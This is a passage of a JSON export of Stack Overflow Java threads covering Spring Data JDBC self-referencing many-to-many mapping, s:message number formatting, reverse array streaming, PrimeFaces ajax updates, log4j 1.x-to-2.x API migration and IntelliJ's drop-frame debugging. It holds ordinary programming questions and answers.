[2]: https://spring.io/blog/2018/09/24/spring-data-jdbc-references-and-aggregates\r\n  [3]: https://spring.io/blog/2021/09/22/spring-data-jdbc-how-do-i-make-bidirectional-relationships","title":"Spring boot data jdbc implement Many to Many relationship with same entity","body":"<p>In your example <code>AsyncTask</code> is an aggregate and its own aggregate root.\nSo references from one <code>AsyncTask</code> to another are considered references between aggregates.</p>\n<p>In Spring Data JDBC (and also recommended in Domain Driven Design) references to other aggregates are to be implemented as ids, not actual Java references.</p>\n<p>For the mapping table you need a separate small entity which becomes part of the aggregate on one side of the relationship.</p>\n<p>Instead of just an <code>Id</code> you can use an <code>AggregateReference</code> in order to avoid having <code>Long</code> values all over the place.</p>\n<p>The complete model could look like this:</p>\n<pre class=\"lang-java prettyprint-override\"><code>\n@Table\nclass AsyncTask {\n\n    @Id\n    Long id;\n    String name;\n\n    @MappedCollection(idColumn = &quot;FROM_ID&quot;)\n    Set&lt;DependentTask&gt; dependents = new HashSet&lt;&gt;();\n\n    AsyncTask(String name) {\n        this.name = name;\n    }\n\n    public void addDependent(AsyncTask task) {\n        dependents.add(new DependentTask(task.id));\n    }\n}\n</code></pre>\n<pre class=\"lang-java prettyprint-override\"><code>\n@Table\nclass DependentTask {\n    @Column(&quot;TO_ID&quot;)\n    AggregateReference&lt;AsyncTask, Long&gt; id; // this is the Id of the dependent task, note that it is not marked with `@Id`\n\n    DependentTask(Long id) {\n        this.id = AggregateReference.to(id);\n    }\n}\n</code></pre>\n<p>And be used like this:</p>\n<pre class=\"lang-java prettyprint-override\"><code>AsyncTask one = repo.save(new AsyncTask(&quot;one&quot;));\nAsyncTask two = repo.save(new AsyncTask(&quot;two&quot;));\n\nAsyncTask three = new AsyncTask(&quot;three&quot;);\nthree.addDependent(one);\nthree.addDependent(two);\nrepo.save(three);\n\none.addDependent(two);\nrepo.save(one);\n\ntwo.addDependent(two);\nrepo.save(two);\n</code></pre>\n<p>The underlying database schema looks like this:</p>\n<pre class=\"lang-sql prettyprint-override\"><code>CREATE TABLE ASYNC_TASK (\n    ID INTEGER IDENTITY PRIMARY KEY,\n    NAME VARCHAR (200) NOT NULL\n);\n\nCREATE TABLE  DEPENDENT_TASK (\n    FROM_ID INTEGER NOT NULL REFERENCES ASYNC_TASK(ID),\n    TO_ID INTEGER NOT NULL REFERENCES ASYNC_TASK(ID)\n);\n</code></pre>\n<p>The <a href=\"https://github.com/schauder/stackoverflow/tree/main/jdbc/m-to-m-self-reference\" rel=\"nofollow noreferrer\">complete source code is on GitHub</a>.</p>\n<p>For more information on the topic read <a href=\"https://spring.io/blog/2018/09/24/spring-data-jdbc-references-and-aggregates\" rel=\"nofollow noreferrer\">Spring Data JDBC, References, and Aggregates</a>\nand <a href=\"https://spring.io/blog/2021/09/22/spring-data-jdbc-how-do-i-make-bidirectional-relationships\" rel=\"nofollow noreferrer\">Spring Data JDBC - How do I make Bidirectional Relationships?</a></p>\n"}],"owner":{"account_id":2391464,"reputation":111,"user_id":2091241,"display_name":"omexIT"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1469,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70363864,"answer_count":1,"score":1,"last_activity_date":1639572044,"creation_date":1639130955,"question_id":70302812,"body_markdown":"How can I model many to many relationship with same entity with spring data jdbc. I have a scenario where a task can depend on several other task and at the same time the task has dependants but it is same object. I have done this previously with jpa\r\n\r\n    @JoinTable(\r\n        name = &quot;task_dependencies&quot;,\r\n        joinColumns = @JoinColumn(name = &quot;dependent_process&quot;),\r\n        inverseJoinColumns = @JoinColumn(name = &quot;depends_on_process&quot;)\r\n    )\r\n    private final Set&lt;AsyncTask&gt; dependencies = new HashSet&lt;&gt;();\r\n\r\n    @ManyToMany(fetch = FetchType.LAZY, mappedBy = &quot;dependencies&quot;)\r\n    private final Set&lt;AsyncTask&gt; dependents = new HashSet&lt;&gt;();","title":"Spring boot data jdbc implement Many to Many relationship with same entity","body":"<p>How can I model many to many relationship with same entity with spring data jdbc. I have a scenario where a task can depend on several other task and at the same time the task has dependants but it is same object. I have done this previously with jpa</p>\n<pre><code>@JoinTable(\n    name = &quot;task_dependencies&quot;,\n    joinColumns = @JoinColumn(name = &quot;dependent_process&quot;),\n    inverseJoinColumns = @JoinColumn(name = &quot;depends_on_process&quot;)\n)\nprivate final Set&lt;AsyncTask&gt; dependencies = new HashSet&lt;&gt;();\n\n@ManyToMany(fetch = FetchType.LAZY, mappedBy = &quot;dependencies&quot;)\nprivate final Set&lt;AsyncTask&gt; dependents = new HashSet&lt;&gt;();\n</code></pre>\n"},{"tags":["java","spring","resourcebundle"],"answers":[{"tags":[],"owner":{"account_id":2615957,"reputation":11395,"user_id":2264997,"display_name":"ikumen"},"down_vote_count":0,"up_vote_count":12,"is_accepted":true,"score":12,"last_activity_date":1639571752,"creation_date":1378281220,"answer_id":18608304,"question_id":18607505,"body_markdown":"As far as I know you can either \r\n\r\n 1. convert `applicationRefId` to String before passing it to messageTag\r\n 2. or apply formatting in your resource bundle\r\n\r\n         application.success=Application {0, number, #} successfully submitted\r\n\r\n\r\n**Second solution documentation**\r\n\r\n - [MessageFormat][1]\r\n - [DecimalFormat][2]\r\n\r\nFrom the `MessageFormat` documentation\r\n\r\n&gt;     FormatElement:\r\n&gt;          { ArgumentIndex }\r\n&gt;          { ArgumentIndex , FormatType }\r\n&gt;          { ArgumentIndex , FormatType , FormatStyle }\r\n\r\nAnd this chart\r\n[![enter image description here][3]][3]\r\n\r\n\r\n  [1]: https://docs.oracle.com/javase/6/docs/api/java/text/MessageFormat.html\r\n  [2]: https://docs.oracle.com/javase/7/docs/api/java/text/DecimalFormat.html\r\n  [3]: https://i.stack.imgur.com/V3r69.png","title":"Prevent default formatting (comma insertion) of long argument in s:message tag","body":"<p>As far as I know you can either</p>\n<ol>\n<li><p>convert <code>applicationRefId</code> to String before passing it to messageTag</p>\n</li>\n<li><p>or apply formatting in your resource bundle</p>\n<pre><code> application.success=Application {0, number, #} successfully submitted\n</code></pre>\n</li>\n</ol>\n<p><strong>Second solution documentation</strong></p>\n<ul>\n<li><a href=\"https://docs.oracle.com/javase/6/docs/api/java/text/MessageFormat.html\" rel=\"nofollow noreferrer\">MessageFormat</a></li>\n<li><a href=\"https://docs.oracle.com/javase/7/docs/api/java/text/DecimalFormat.html\" rel=\"nofollow noreferrer\">DecimalFormat</a></li>\n</ul>\n<p>From the <code>MessageFormat</code> documentation</p>\n<blockquote>\n<pre><code>FormatElement:\n     { ArgumentIndex }\n     { ArgumentIndex , FormatType }\n     { ArgumentIndex , FormatType , FormatStyle }\n</code></pre>\n</blockquote>\n<p>And this chart\n<a href=\"https://i.stack.imgur.com/V3r69.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/V3r69.png\" alt=\"enter image description here\" /></a></p>\n"}],"owner":{"account_id":286575,"reputation":1484,"user_id":585903,"accept_rate":72,"display_name":"Sumit Jain"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2560,"favorite_count":0,"down_vote_count":0,"up_vote_count":9,"accepted_answer_id":18608304,"answer_count":1,"score":9,"last_activity_date":1639571752,"creation_date":1378278569,"question_id":18607505,"body_markdown":"I have a jsp in which I use spring s:message tag \r\n\r\n    &lt;s:message code=&quot;application.success&quot; arguments=&quot;${applicationRefId}&quot; /&gt;\r\n\r\napplicationRefId is a long variable added to the model.\r\n\r\nIn my resource bundle, I have defined message code quite regularly as\r\n\r\n    application.success=Application {0} successfully submitted\r\n\r\nBut this results in \r\n\r\n    Application 74,311 successfully submitted\r\n\r\nHere my long value is formatted with commas. I have two questions - Why does this formatting happen, by default, and how can I prevent it?","title":"Prevent default formatting (comma insertion) of long argument in s:message tag","body":"<p>I have a jsp in which I use spring s:message tag </p>\n\n<pre><code>&lt;s:message code=\"application.success\" arguments=\"${applicationRefId}\" /&gt;\n</code></pre>\n\n<p>applicationRefId is a long variable added to the model.</p>\n\n<p>In my resource bundle, I have defined message code quite regularly as</p>\n\n<pre><code>application.success=Application {0} successfully submitted\n</code></pre>\n\n<p>But this results in </p>\n\n<pre><code>Application 74,311 successfully submitted\n</code></pre>\n\n<p>Here my long value is formatted with commas. I have two questions - Why does this formatting happen, by default, and how can I prevent it?</p>\n"},{"tags":["java","arrays","java-stream","reverse"],"answers":[{"tags":[],"owner":{"account_id":162699,"reputation":138060,"user_id":3788176,"accept_rate":54,"display_name":"Andy Turner"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1639571730,"creation_date":1639571730,"answer_id":70363794,"question_id":70363760,"body_markdown":"&gt; Does streaming an array and then reversing the order of the stream result in the overhead\r\n\r\nYes.\r\n\r\n&gt; Is the only way to circumvent overhead (e.g. like the creation of an additional List) to iterate over the array in reverse order?\r\n\r\nYes, do it with an `IntStream`:\r\n\r\n```\r\nIntStream.range(0, arr.length).mapToObj(i -&gt; arr[arr.length-1-i])\r\n```","title":"Stream array in reverse order / Java","body":"<blockquote>\n<p>Does streaming an array and then reversing the order of the stream result in the overhead</p>\n</blockquote>\n<p>Yes.</p>\n<blockquote>\n<p>Is the only way to circumvent overhead (e.g. like the creation of an additional List) to iterate over the array in reverse order?</p>\n</blockquote>\n<p>Yes, do it with an <code>IntStream</code>:</p>\n<pre><code>IntStream.range(0, arr.length).mapToObj(i -&gt; arr[arr.length-1-i])\n</code></pre>\n"}],"owner":{"account_id":8947883,"reputation":1892,"user_id":6674599,"display_name":"Semnodime"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1595,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1639571730,"creation_date":1639571580,"question_id":70363760,"body_markdown":"Reversing an ordered stream\r\n---\r\nDoes **streaming an array** and **then reversing the order of the stream** result in the **overhead** (e.g. like the necessity to fully stream the array first and then iterate on it backwards)**?**\r\n\r\nUsing a helper structure\r\n---\r\n```\r\nfinal Object[] arr; // assume this is filled\r\nList&lt;Integer&gt; list = Arrays.asList(arr);\r\nCollections.reverse(list);\r\nlist.stream();\r\n```\r\n\r\nIs the only way to circumvent overhead (e.g. like the creation of an additional List) to iterate over the array in reverse order?","title":"Stream array in reverse order / Java","body":"<h2>Reversing an ordered stream</h2>\n<p>Does <strong>streaming an array</strong> and <strong>then reversing the order of the stream</strong> result in the <strong>overhead</strong> (e.g. like the necessity to fully stream the array first and then iterate on it backwards)<strong>?</strong></p>\n<h2>Using a helper structure</h2>\n<pre><code>final Object[] arr; // assume this is filled\nList&lt;Integer&gt; list = Arrays.asList(arr);\nCollections.reverse(list);\nlist.stream();\n</code></pre>\n<p>Is the only way to circumvent overhead (e.g. like the creation of an additional List) to iterate over the array in reverse order?</p>\n"},{"tags":["java","html","primefaces"],"answers":[{"tags":[],"owner":{"account_id":7990830,"reputation":187,"user_id":6028739,"display_name":"KHanusova"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1510059984,"creation_date":1510059984,"answer_id":47158768,"question_id":47158671,"body_markdown":"Try to update &quot;comments&quot; instead of &quot;commentsCol&quot;","title":"Primefaces ajax update not working for field inside &lt;p:column&gt;","body":"<p>Try to update \"comments\" instead of \"commentsCol\"</p>\n"},{"tags":[],"owner":{"account_id":11802871,"reputation":113,"user_id":8636108,"display_name":"Mitchell Brooks"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1510065884,"creation_date":1510063389,"answer_id":47159891,"question_id":47158671,"body_markdown":"I solved the problem by putting an id on the `p:panelGrid` and updating that instead of the column.\r\n\r\n        &lt;p:panelGrid id=&quot;foo&quot;&gt;\r\n\r\n            &lt;p:row&gt;\r\n                &lt;p:column style=&quot;width:15%&quot;&gt;\r\n                    &lt;p:selectOneMenu id=&quot;gender&quot; value=&quot;#{myBean.model.gender}&quot;&gt;\r\n                        &lt;f:selectItem itemValue=&quot;M&quot; itemLabel=&quot;Male&quot; /&gt;\r\n                        &lt;f:selectItem itemValue=&quot;F&quot; itemLabel=&quot;Female&quot; /&gt;\r\n                        &lt;p:ajax event=&quot;change&quot; listener=&quot;#{myBean.genderListener}&quot; process=&quot;@this&quot; update=&quot;foo&quot; /&gt;\r\n                    &lt;/p:selectOneMenu&gt;\r\n                &lt;/p:column&gt;\r\n\r\n                &lt;p:column id=&quot;commentsCol&quot; style=&quot;width:50%&quot;&gt;\r\n                    &lt;p:inputTextarea id=&quot;comments&quot; cols=&quot;100&quot; rows=&quot;2&quot; value=&quot;#{myBean.model.comments}&quot; rendered=&quot;#{myBean.renderComments}&quot; /&gt;\r\n                &lt;/p:column&gt;\r\n            &lt;/p:row&gt;\r\n\r\n\r\n        &lt;/p:panelGrid&gt;","title":"Primefaces ajax update not working for field inside &lt;p:column&gt;","body":"<p>I solved the problem by putting an id on the <code>p:panelGrid</code> and updating that instead of the column.</p>\n\n<pre><code>    &lt;p:panelGrid id=\"foo\"&gt;\n\n        &lt;p:row&gt;\n            &lt;p:column style=\"width:15%\"&gt;\n                &lt;p:selectOneMenu id=\"gender\" value=\"#{myBean.model.gender}\"&gt;\n                    &lt;f:selectItem itemValue=\"M\" itemLabel=\"Male\" /&gt;\n                    &lt;f:selectItem itemValue=\"F\" itemLabel=\"Female\" /&gt;\n                    &lt;p:ajax event=\"change\" listener=\"#{myBean.genderListener}\" process=\"@this\" update=\"foo\" /&gt;\n                &lt;/p:selectOneMenu&gt;\n            &lt;/p:column&gt;\n\n            &lt;p:column id=\"commentsCol\" style=\"width:50%\"&gt;\n                &lt;p:inputTextarea id=\"comments\" cols=\"100\" rows=\"2\" value=\"#{myBean.model.comments}\" rendered=\"#{myBean.renderComments}\" /&gt;\n            &lt;/p:column&gt;\n        &lt;/p:row&gt;\n\n\n    &lt;/p:panelGrid&gt;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1986559,"reputation":9239,"user_id":1781611,"accept_rate":55,"display_name":"Jay"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1510237207,"creation_date":1510237207,"answer_id":47204183,"question_id":47158671,"body_markdown":"I managed to fix this by wrapping a &lt; h: panelGroup&gt; around the element and using the panelGroup id alone to update.\r\n\r\nThe equivalent full code is like this \r\n\r\n   \t\t&lt;p:panelGrid&gt;\r\n            &lt;p:row&gt;\r\n                &lt;p:column style=&quot;width:15%&quot;&gt;\r\n                    &lt;p:selectOneMenu id=&quot;gender&quot; value=&quot;#{myBean.model.gender}&quot;&gt;\r\n                        &lt;f:selectItem itemValue=&quot;M&quot; itemLabel=&quot;Male&quot; /&gt;\r\n                        &lt;f:selectItem itemValue=&quot;F&quot; itemLabel=&quot;Female&quot; /&gt;\r\n                        &lt;p:ajax event=&quot;change&quot; listener=&quot;#{myBean.genderListener}&quot; process=&quot;@this&quot; update=&quot;commentsPanel&quot; /&gt;\r\n                    &lt;/p:selectOneMenu&gt;\r\n                &lt;/p:column&gt;\r\n\r\n                &lt;p:column style=&quot;width:50%&quot;&gt;\r\n\t\t\t\t\t&lt;h:panelGroup id=&quot;commentsPanel&quot;&gt;\t\t\t\t\r\n\t\t\t\t\t\t&lt;p:inputTextarea id=&quot;comments&quot; cols=&quot;100&quot; rows=&quot;2&quot; value=&quot;#{myBean.model.comments}&quot; rendered=&quot;#{myBean.renderComments}&quot; /&gt;\r\n\t\t\t\t\t&lt;/h:panelGroup&gt;\r\n                &lt;/p:column&gt;\r\n            &lt;/p:row&gt;\r\n\r\n        &lt;/p:panelGrid&gt;","title":"Primefaces ajax update not working for field inside &lt;p:column&gt;","body":"<p>I managed to fix this by wrapping a &lt; h: panelGroup> around the element and using the panelGroup id alone to update.</p>\n\n<p>The equivalent full code is like this </p>\n\n<pre><code>    &lt;p:panelGrid&gt;\n        &lt;p:row&gt;\n            &lt;p:column style=\"width:15%\"&gt;\n                &lt;p:selectOneMenu id=\"gender\" value=\"#{myBean.model.gender}\"&gt;\n                    &lt;f:selectItem itemValue=\"M\" itemLabel=\"Male\" /&gt;\n                    &lt;f:selectItem itemValue=\"F\" itemLabel=\"Female\" /&gt;\n                    &lt;p:ajax event=\"change\" listener=\"#{myBean.genderListener}\" process=\"@this\" update=\"commentsPanel\" /&gt;\n                &lt;/p:selectOneMenu&gt;\n            &lt;/p:column&gt;\n\n            &lt;p:column style=\"width:50%\"&gt;\n                &lt;h:panelGroup id=\"commentsPanel\"&gt;               \n                    &lt;p:inputTextarea id=\"comments\" cols=\"100\" rows=\"2\" value=\"#{myBean.model.comments}\" rendered=\"#{myBean.renderComments}\" /&gt;\n                &lt;/h:panelGroup&gt;\n            &lt;/p:column&gt;\n        &lt;/p:row&gt;\n\n    &lt;/p:panelGrid&gt;\n</code></pre>\n"}],"owner":{"account_id":1986559,"reputation":9239,"user_id":1781611,"accept_rate":55,"display_name":"Jay"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":3982,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"accepted_answer_id":47204183,"answer_count":3,"score":2,"last_activity_date":1639571710,"creation_date":1510059651,"question_id":47158671,"body_markdown":"I have a primefaces code like this.\r\nAfter selecting the drop down, if the value is &#39;M&#39;, I want to render a comment textarea.\r\n\r\nIt works fine and shows the textarea, but on selecting &#39;F&#39;, it is not hiding the textarea even though the renderComments value is false.\r\n\r\nI think the update is not happening properly because of the &lt; p: column&gt; tag.\r\nHow to fix this, please\r\n\r\n**HTML**\r\n\r\n\t\t\t&lt;p:panelGrid&gt;\r\n\r\n\t\t\t\t&lt;p:row&gt;\r\n\t\t\t\t\t&lt;p:column style=&quot;width:15%&quot;&gt;\r\n\t\t\t\t\t\t&lt;p:selectOneMenu id=&quot;gender&quot; value=&quot;#{myBean.model.gender}&quot;&gt;\r\n\t\t\t\t\t\t\t&lt;f:selectItem itemValue=&quot;M&quot; itemLabel=&quot;Male&quot; /&gt;\r\n\t\t\t\t\t\t\t&lt;f:selectItem itemValue=&quot;F&quot; itemLabel=&quot;Female&quot; /&gt;\r\n\t\t\t\t\t\t\t&lt;p:ajax event=&quot;change&quot; listener=&quot;#{myBean.genderListener}&quot; process=&quot;@this&quot; update=&quot;commentsCol comments&quot; /&gt;\r\n\t\t\t\t\t\t&lt;/p:selectOneMenu&gt;\r\n\t\t\t\t\t&lt;/p:column&gt;\r\n\r\n\t\t\t\t\t&lt;p:column id=&quot;commentsCol&quot; style=&quot;width:50%&quot;&gt;\r\n\t\t\t\t\t\t&lt;p:inputTextarea id=&quot;comments&quot; cols=&quot;100&quot; rows=&quot;2&quot; value=&quot;#{myBean.model.comments}&quot; rendered=&quot;#{myBean.renderComments}&quot; /&gt;\r\n\t\t\t\t\t&lt;/p:column&gt;\r\n\t\t\t\t&lt;/p:row&gt;\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t&lt;/p:panelGrid&gt;\r\n\r\n**Bean**\r\n\r\n\t/**\r\n\t * Event for gender.\r\n\t */\r\n\tpublic void genderListener() {\r\n\r\n\t\tif (&quot;M&quot;.equalsIgnoreCase(model.getGender())) {\r\n\t\t\trenderComments = true;\r\n\t\t}\r\n\t\telse {\r\n\t\t\trenderComments = false;\r\n\t\t}\r\n\t}\t\t\t\r\n\r\n**Update**\r\n\r\nIf I use update=&quot;@form&quot; it works. However it updates the whole form which I dont expect. Not sure what is wrong if I specify only the ids (commentsCol comments)\r\n","title":"Primefaces ajax update not working for field inside &lt;p:column&gt;","body":"<p>I have a primefaces code like this.\nAfter selecting the drop down, if the value is 'M', I want to render a comment textarea.</p>\n\n<p>It works fine and shows the textarea, but on selecting 'F', it is not hiding the textarea even though the renderComments value is false.</p>\n\n<p>I think the update is not happening properly because of the &lt; p: column> tag.\nHow to fix this, please</p>\n\n<p><strong>HTML</strong></p>\n\n<pre><code>        &lt;p:panelGrid&gt;\n\n            &lt;p:row&gt;\n                &lt;p:column style=\"width:15%\"&gt;\n                    &lt;p:selectOneMenu id=\"gender\" value=\"#{myBean.model.gender}\"&gt;\n                        &lt;f:selectItem itemValue=\"M\" itemLabel=\"Male\" /&gt;\n                        &lt;f:selectItem itemValue=\"F\" itemLabel=\"Female\" /&gt;\n                        &lt;p:ajax event=\"change\" listener=\"#{myBean.genderListener}\" process=\"@this\" update=\"commentsCol comments\" /&gt;\n                    &lt;/p:selectOneMenu&gt;\n                &lt;/p:column&gt;\n\n                &lt;p:column id=\"commentsCol\" style=\"width:50%\"&gt;\n                    &lt;p:inputTextarea id=\"comments\" cols=\"100\" rows=\"2\" value=\"#{myBean.model.comments}\" rendered=\"#{myBean.renderComments}\" /&gt;\n                &lt;/p:column&gt;\n            &lt;/p:row&gt;\n\n\n        &lt;/p:panelGrid&gt;\n</code></pre>\n\n<p><strong>Bean</strong></p>\n\n<pre><code>/**\n * Event for gender.\n */\npublic void genderListener() {\n\n    if (\"M\".equalsIgnoreCase(model.getGender())) {\n        renderComments = true;\n    }\n    else {\n        renderComments = false;\n    }\n}           \n</code></pre>\n\n<p><strong>Update</strong></p>\n\n<p>If I use update=\"@form\" it works. However it updates the whole form which I dont expect. Not sure what is wrong if I specify only the ids (commentsCol comments)</p>\n"},{"tags":["java","log4j"],"comments":[{"owner":{"account_id":3597514,"reputation":117143,"user_id":3001761,"display_name":"jonrsharpe"},"score":1,"creation_date":1639557061,"post_id":70360469,"comment_id":124376231,"body_markdown":"Log4j v1 didn&#39;t have the vulnerable functionality at all: https://stackoverflow.com/q/70310980/3001761.","body":"Log4j v1 didn&#39;t have the vulnerable functionality at all: <a href=\"https://stackoverflow.com/q/70310980/3001761\">stackoverflow.com/q/70310980/3001761</a>."},{"owner":{"account_id":19254723,"reputation":2061,"user_id":14071914,"display_name":"JustAnotherDeveloper"},"score":0,"creation_date":1639557181,"post_id":70360469,"comment_id":124376278,"body_markdown":"log4j 1.2.17 is not affected by the vulnerability. But even if it were, the library has documentation that will tell you what changed between versions 1.x and 2.x, and how to instantiate loggers in 2.x. They even have a migration guide in their web site that you probably will want to read.","body":"log4j 1.2.17 is not affected by the vulnerability. But even if it were, the library has documentation that will tell you what changed between versions 1.x and 2.x, and how to instantiate loggers in 2.x. They even have a migration guide in their web site that you probably will want to read."},{"owner":{"account_id":551394,"reputation":8315,"user_id":916225,"accept_rate":69,"display_name":"seenukarthi"},"score":3,"creation_date":1639557197,"post_id":70360469,"comment_id":124376281,"body_markdown":"You are migrating from Log4J version 1.x to 2.x check https://logging.apache.org/log4j/2.x/manual/migration.html","body":"You are migrating from Log4J version 1.x to 2.x check <a href=\"https://logging.apache.org/log4j/2.x/manual/migration.html\" rel=\"nofollow noreferrer\">logging.apache.org/log4j/2.x/manual/migration.html</a>"}],"answers":[{"tags":[],"owner":{"account_id":2818342,"reputation":299856,"user_id":2422776,"display_name":"Mureinik"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1639558199,"creation_date":1639557187,"answer_id":70360517,"question_id":70360469,"body_markdown":"Log4j&#39;s API changed between 1.x and 2.x. In log4j 2.x, you should use [`LogManager.getLogger`](https://logging.apache.org/log4j/2.x/log4j-api/apidocs/org/apache/logging/log4j/LogManager.html#getLogger-java.lang.Class-) instead:\r\n\r\n```java\r\nstatic Logger log = LogManager.getLogger(TestAuthor.class);\r\n```","title":"Logger.getLogger(), LogManager.resetConfiguration() and PropertyConfigurator.configure(props) not working in log4j 2.16","body":"<p>Log4j's API changed between 1.x and 2.x. In log4j 2.x, you should use <a href=\"https://logging.apache.org/log4j/2.x/log4j-api/apidocs/org/apache/logging/log4j/LogManager.html#getLogger-java.lang.Class-\" rel=\"nofollow noreferrer\"><code>LogManager.getLogger</code></a> instead:</p>\n<pre class=\"lang-java prettyprint-override\"><code>static Logger log = LogManager.getLogger(TestAuthor.class);\n</code></pre>\n"}],"owner":{"account_id":21320273,"reputation":55,"user_id":15693567,"display_name":"Cris_new"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1904,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"closed_date":1639557651,"accepted_answer_id":70360517,"answer_count":1,"score":0,"last_activity_date":1639571409,"creation_date":1639556855,"question_id":70360469,"body_markdown":"Due to the latest log4j fiasco, we need to reorganize few of our codes. Earlier it was running on log4j-1.2.17. Now while using log4j-2.16, we&#39;re getting error at first place:\r\n\r\n```\r\nstatic Logger log = Logger.getLogger(TestAuthor.class);\r\n``` \r\nMethod &#39;getLogger&#39; not found.\r\n\r\nLogManager.resetConfiguration();- not found.\r\nPropertyConfigurator.configure(props);-not found\r\n\r\n\r\nIs there any other way to define this?","title":"Logger.getLogger(), LogManager.resetConfiguration() and PropertyConfigurator.configure(props) not working in log4j 2.16","body":"<p>Due to the latest log4j fiasco, we need to reorganize few of our codes. Earlier it was running on log4j-1.2.17. Now while using log4j-2.16, we're getting error at first place:</p>\n<pre><code>static Logger log = Logger.getLogger(TestAuthor.class);\n</code></pre>\n<p>Method 'getLogger' not found.</p>\n<p>LogManager.resetConfiguration();- not found.\nPropertyConfigurator.configure(props);-not found</p>\n<p>Is there any other way to define this?</p>\n"},{"tags":["java","debugging","intellij-idea"],"answers":[{"tags":[],"owner":{"account_id":2339925,"reputation":15581,"user_id":2051454,"accept_rate":60,"display_name":"Software Engineer"},"down_vote_count":1,"up_vote_count":106,"is_accepted":true,"score":105,"last_activity_date":1639571157,"creation_date":1396628205,"answer_id":22867949,"question_id":22867491,"body_markdown":"You can drop the frames until you reach the point where you want to be. This isn&#39;t exactly stepping backwards, but it is quite similar in a lot of respects. \r\n\r\nThough as the comments mention below, this will not revert the global state of your application -- which isn&#39;t a huge concern if you&#39;re developing stateless services, but could be if you&#39;re developing swing applications (if anyone actually does that any more). \r\n\r\nOn the debugger toolbar it looks like this: ![Drop Frame][1]. In `Idea 2016.3` the drop-frame icon changed to look like this [![drop frame in idea 2016.3][2]][2], and since `2019.3` it changed to look like this [![enter image description here][3]][3].\r\n\r\nFull documentation is available here: [IntelliJ Debugger Docs][4], and there is a [StackOverflow Drop Frame Question][5], with a few useful answers\r\n\r\n\r\n  [1]: http://i.stack.imgur.com/exxul.png\r\n  [2]: https://i.stack.imgur.com/0Ho9T.png\r\n  [3]: https://i.stack.imgur.com/E78y5.png\r\n  [4]: https://www.jetbrains.com/idea/webhelp/debug-tool-window.html\r\n  [5]: https://stackoverflow.com/questions/2367816/when-using-the-java-debugger-in-intellij-what-does-drop-frame-mean","title":"How to step one step back in IntelliJ?","body":"<p>You can drop the frames until you reach the point where you want to be. This isn't exactly stepping backwards, but it is quite similar in a lot of respects.</p>\n<p>Though as the comments mention below, this will not revert the global state of your application -- which isn't a huge concern if you're developing stateless services, but could be if you're developing swing applications (if anyone actually does that any more).</p>\n<p>On the debugger toolbar it looks like this: <img src=\"https://i.stack.imgur.com/exxul.png\" alt=\"Drop Frame\" />. In <code>Idea 2016.3</code> the drop-frame icon changed to look like this <a href=\"https://i.stack.imgur.com/0Ho9T.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/0Ho9T.png\" alt=\"drop frame in idea 2016.3\" /></a>, and since <code>2019.3</code> it changed to look like this <a href=\"https://i.stack.imgur.com/E78y5.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/E78y5.png\" alt=\"enter image description here\" /></a>.</p>\n<p>Full documentation is available here: <a href=\"https://www.jetbrains.com/idea/webhelp/debug-tool-window.html\" rel=\"noreferrer\">IntelliJ Debugger Docs</a>, and there is a <a href=\"https://stackoverflow.com/questions/2367816/when-using-the-java-debugger-in-intellij-what-does-drop-frame-mean\">StackOverflow Drop Frame Question</a>, with a few useful answers</p>\n"},{"tags":[],"owner":{"account_id":3784962,"reputation":593,"user_id":3160671,"accept_rate":80,"display_name":"tales"},"down_vote_count":1,"up_vote_count":5,"is_accepted":false,"score":4,"last_activity_date":1413867854,"creation_date":1413867854,"answer_id":26479233,"question_id":22867491,"body_markdown":"Check out Chronon Debugger plugin which actually allows you to step back, not just drop the frame\r\nhttp://blog.jetbrains.com/idea/2014/03/try-chronon-debugger-with-intellij-idea-13-1-eap/","title":"How to step one step back in IntelliJ?","body":"<p>Check out Chronon Debugger plugin which actually allows you to step back, not just drop the frame\n<a href=\"http://blog.jetbrains.com/idea/2014/03/try-chronon-debugger-with-intellij-idea-13-1-eap/\" rel=\"nofollow\">http://blog.jetbrains.com/idea/2014/03/try-chronon-debugger-with-intellij-idea-13-1-eap/</a></p>\n"}],"owner":{"account_id":2682718,"reputation":1241,"user_id":3080655,"accept_rate":71,"display_name":"Cristian Gutu"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":60405,"favorite_count":0,"down_vote_count":0,"up_vote_count":88,"accepted_answer_id":22867949,"answer_count":2,"score":88,"last_activity_date":1639571157,"creation_date":1396626828,"question_id":22867491,"body_markdown":"Is it possible to step backwards through executed code in a debug session?\r\n\r\nFor example I step over a method called `abc()` expecting to get `12` but after re-checking the value returned I notice it&#39;s `5` instead of `12`. How can I step back to where I was before and step into the method to see what is going on?  I know you can do this in visual studio but I can&#39;t find how to do this in intelliJ.  ","title":"How to step one step back in IntelliJ?","body":"<p>Is it possible to step backwards through executed code in a debug session?</p>\n\n<p>For example I step over a method called <code>abc()</code> expecting to get <code>12</code> but after re-checking the value returned I notice it's <code>5</code> instead of <code>12</code>. How can I step back to where I was before and step into the method to see what is going on?  I know you can do this in visual studio but I can't find how to do this in intelliJ.  